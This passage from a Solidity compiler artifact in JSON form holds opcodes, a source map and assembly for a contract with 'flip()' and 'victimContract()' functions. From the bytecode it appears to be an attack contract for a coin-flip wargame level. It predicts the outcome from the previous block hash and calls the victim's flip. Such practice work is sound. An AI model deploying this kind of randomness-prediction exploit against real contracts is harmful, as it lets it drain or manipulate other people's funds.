							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xF32D251D EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x77 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x158 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x231 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x87 SWAP2 SWAP1 PUSH2 0x285 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x9D SWAP2 SWAP1 PUSH2 0x2E8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xB0 JUMPI PUSH1 0x0 PUSH2 0xB3 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x10E SWAP2 SWAP1 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x12D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x151 SWAP2 SWAP1 PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x191 DUP2 PUSH2 0x17C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1AC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x188 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F7 PUSH2 0x1F2 PUSH2 0x1ED DUP5 PUSH2 0x1B2 JUMP JUMPDEST PUSH2 0x1D2 JUMP JUMPDEST PUSH2 0x1B2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x209 DUP3 PUSH2 0x1DC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x21B DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22B DUP2 PUSH2 0x210 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x246 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x222 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x290 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP2 POP PUSH2 0x29B DUP4 PUSH2 0x24C JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2AE JUMPI PUSH2 0x2AD PUSH2 0x256 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x2F3 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP2 POP PUSH2 0x2FE DUP4 PUSH2 0x24C JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x30E JUMPI PUSH2 0x30D PUSH2 0x2B9 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x327 DUP2 PUSH2 0x17C JUMP JUMPDEST DUP2 EQ PUSH2 0x332 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x344 DUP2 PUSH2 0x31E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x360 JUMPI PUSH2 0x35F PUSH2 0x319 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x36E DUP5 DUP3 DUP6 ADD PUSH2 0x335 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY 0xD2 0xD9 DUP14 0x28 PUSH2 0xFC83 0xDD BYTE LOG3 SELFBALANCE STATICCALL XOR 0xDE STOP 0x4E 0xEF PUSH2 0xAD0F STOP GASLIMIT 0xAC CALLDATASIZE 0xD1 PUSH20 0x753F00F16C64736F6C634300080F003300000000 ",
							"sourceMap": "167:544:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;453:253;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;198:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;453:253;485:4;500:18;554:1;539:12;:16;;;;:::i;:::-;529:27;521:36;;500:57;;566:16;604:6;;593:10;:17;;;;:::i;:::-;566:45;;620:9;644:1;632:8;:13;:28;;655:5;632:28;;;648:4;632:28;620:40;;669:14;;;;;;;;;;:19;;;689:4;669:25;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;491:215;;;453:253;:::o;198:30::-;;;;;;;;;;;;:::o;7:90:3:-;41:7;84:5;77:13;70:21;59:32;;7:90;;;:::o;103:109::-;184:21;199:5;184:21;:::i;:::-;179:3;172:34;103:109;;:::o;218:210::-;305:4;343:2;332:9;328:18;320:26;;356:65;418:1;407:9;403:17;394:6;356:65;:::i;:::-;218:210;;;;:::o;434:126::-;471:7;511:42;504:5;500:54;489:65;;434:126;;;:::o;566:60::-;594:3;615:5;608:12;;566:60;;;:::o;632:142::-;682:9;715:53;733:34;742:24;760:5;742:24;:::i;:::-;733:34;:::i;:::-;715:53;:::i;:::-;702:66;;632:142;;;:::o;780:126::-;830:9;863:37;894:5;863:37;:::i;:::-;850:50;;780:126;;;:::o;912:141::-;977:9;1010:37;1041:5;1010:37;:::i;:::-;997:50;;912:141;;;:::o;1059:161::-;1161:52;1207:5;1161:52;:::i;:::-;1156:3;1149:65;1059:161;;:::o;1226:252::-;1334:4;1372:2;1361:9;1357:18;1349:26;;1385:86;1468:1;1457:9;1453:17;1444:6;1385:86;:::i;:::-;1226:252;;;;:::o;1484:77::-;1521:7;1550:5;1539:16;;1484:77;;;:::o;1567:180::-;1615:77;1612:1;1605:88;1712:4;1709:1;1702:15;1736:4;1733:1;1726:15;1753:191;1793:4;1813:20;1831:1;1813:20;:::i;:::-;1808:25;;1847:20;1865:1;1847:20;:::i;:::-;1842:25;;1886:1;1883;1880:8;1877:34;;;1891:18;;:::i;:::-;1877:34;1936:1;1933;1929:9;1921:17;;1753:191;;;;:::o;1950:180::-;1998:77;1995:1;1988:88;2095:4;2092:1;2085:15;2119:4;2116:1;2109:15;2136:185;2176:1;2193:20;2211:1;2193:20;:::i;:::-;2188:25;;2227:20;2245:1;2227:20;:::i;:::-;2222:25;;2266:1;2256:35;;2271:18;;:::i;:::-;2256:35;2313:1;2310;2306:9;2301:14;;2136:185;;;;:::o;2408:117::-;2517:1;2514;2507:12;2654:116;2724:21;2739:5;2724:21;:::i;:::-;2717:5;2714:32;2704:60;;2760:1;2757;2750:12;2704:60;2654:116;:::o;2776:137::-;2830:5;2861:6;2855:13;2846:22;;2877:30;2901:5;2877:30;:::i;:::-;2776:137;;;;:::o;2919:345::-;2986:6;3035:2;3023:9;3014:7;3010:23;3006:32;3003:119;;;3041:79;;:::i;:::-;3003:119;3161:1;3186:61;3239:7;3230:6;3219:9;3215:22;3186:61;:::i;:::-;3176:71;;3132:125;2919:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "188200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"flip()": "infinite",
								"victimContract()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 250,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 233,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 233,
									"end": 327,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 334,
									"end": 447,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 334,
									"end": 447,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 418,
									"end": 440,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 392,
									"end": 406,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 392,
									"end": 406,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 392,
									"end": 441,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 392,
									"end": 441,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 392,
									"end": 441,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 392,
									"end": 441,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 447,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 3,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 3
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 3,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 3,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 3
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 3,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 3,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 3,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 3
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 3
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 3
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 3,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 3,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 3
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 3
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 3
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 3,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 3,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 3,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 3
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 3
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 3
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 3
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 3
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 3,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 3,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 3,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 3
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 3
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 3
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 3
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 3,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 3,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 3
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 3
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 3
								},
								{
									"begin": 167,
									"end": 711,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 167,
									"end": 711,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 167,
									"end": 711,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122039d2d98d2861fc83dd1aa347fa18de004eef61ad0f0045ac36d173753f00f16c64736f6c634300080f0033",
									".code": [
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 167,
											"end": 711,
											"name": "PUSH",
											"source": 1,
											"value": "CDE4EFA9"
										},
										{
											"begin": 167,
											"end": 711,
											"name": "EQ",
											"source": 1
										},
